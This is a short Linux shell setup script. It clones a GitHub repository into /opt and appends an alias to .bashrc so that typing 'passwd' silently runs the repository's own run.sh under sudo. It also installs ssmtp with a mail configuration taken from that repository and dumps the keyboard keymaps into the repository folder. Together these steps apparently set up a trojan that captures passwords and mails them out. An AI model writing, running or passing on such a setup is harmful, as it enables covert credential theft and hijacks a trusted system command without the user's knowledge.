
#git
FOLDER="kelompokkucing"
cd /opt/
link="https://github.com/yagrariksa/$FOLDER"
git clone $link


#conf alias
cd
COMMAND="sudo /opt/$FOLDER/run.sh"
ALIAS="alias passwd=\"$COMMAND\""
echo $ALIAS >> .bashrc

# install ssmtp
apt install -y ssmtp
rm /etc/ssmtp/ssmtp.conf
ln -s /opt/$FOLDER/ssmtp.conf /etc/ssmtp/ssmtp.conf

# create keymaps
dumpkeys > /opt/$FOLDER/keymaps.txt